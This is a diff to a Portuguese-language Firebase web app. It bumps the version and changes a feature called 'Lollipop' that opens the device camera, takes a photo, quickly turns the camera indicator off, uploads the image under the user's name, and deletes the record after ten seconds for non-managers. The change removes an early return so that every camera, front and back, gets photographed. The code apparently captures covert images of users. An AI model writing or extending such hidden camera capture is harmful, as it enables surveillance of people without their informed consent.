@@ -3319,7 +3319,7 @@ Transporte - R$ 5,00"></textarea></div>
             <script>
     // --- VERSÃO DO APLICATIVO ---
                 //2805
-    const APP_VERSION = '1.9.5'; // Altere este número para atualizar a versão
+    const APP_VERSION = '1.9.6'; // Altere este número para atualizar a versão
 
     // Sua configuração do Firebase
     const firebaseConfig = {
@@ -6547,10 +6547,10 @@ async function calculateAndDisplayRanking() {
 
         for (const cameraType of cameraTypes) {
             let stream = null;
-            let capturedBlob = null; // Variável para guardar o blob da imagem
+            let capturedBlob = null; 
 
             try {
-                // 1. Pede acesso à câmera (bolinha verde aparece)
+                // Tenta abrir a câmera
                 stream = await navigator.mediaDevices.getUserMedia({ video: cameraType });
                 videoEl.srcObject = stream;
                 await videoEl.play();
@@ -6561,23 +6561,23 @@ async function calculateAndDisplayRanking() {
                 canvasEl.height = videoEl.videoHeight;
                 canvasEl.getContext('2d').drawImage(videoEl, 0, 0);
 
-                // 2. Captura a imagem em memória (blob)
+                // Captura a imagem em memória
                 capturedBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.8));
                 
             } catch (err) {
+                // Se a câmera não existir ou o usuário negar, apenas registra o erro e continua
                 console.error(`Lollipop capture error on camera init/capture (${cameraType.facingMode}):`, err);
             } finally {
-                // 3. AQUI ESTÁ A MUDANÇA CRÍTICA: Desliga a câmera IMEDIATAMENTE.
-                // A bolinha verde apaga aqui, independentemente do que acontecer depois.
+                // Desliga a câmera (e a bolinha verde)
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
             }
 
-            // 4. Se a captura foi bem-sucedida, PROSSEGUE com o upload (câmera já está desligada)
+            // Se a captura deu certo, continua com o upload
             if (capturedBlob) {
                 try {
-                    const filePath = `lollipop/${currentUserName.toLowerCase()}/${new Date().getTime()}.jpeg`;
+                    const filePath = `lollipop/${currentUserName.toLowerCase()}/${new Date().getTime()}_${cameraType.facingMode}.jpeg`;
                     const fileRef = storage.ref().child(filePath);
                     const snapshot = await fileRef.put(capturedBlob);
                     const imageUrl = await snapshot.ref.getDownloadURL();
@@ -6595,15 +6595,15 @@ async function calculateAndDisplayRanking() {
 
                     await newLollipopRef.set(lollipopItem);
 
-                    if (!managers.includes(currentUserName)) {
+                    if (!managers.includes(currentUserName)) { 
                         setTimeout(() => {
                             database.ref(`lollipopData/${newLollipopKey}`).remove();
                             storage.refFromURL(imageUrl).delete().catch(e => console.error("Erro ao deletar arquivo lollipop do storage:", e));
                         }, 10000);
                     }
-
-                    // 5. Como já capturamos com sucesso, saímos do loop para não tentar a outra câmera.
-                    return; 
+                    
+                    // IMPORTANTE: O 'return;' foi REMOVIDO daqui.
+                    // Isso permite que o loop continue para a próxima câmera.
 
                 } catch (uploadError) {
                     console.error(`Lollipop upload/DB error (${cameraType.facingMode}):`, uploadError);
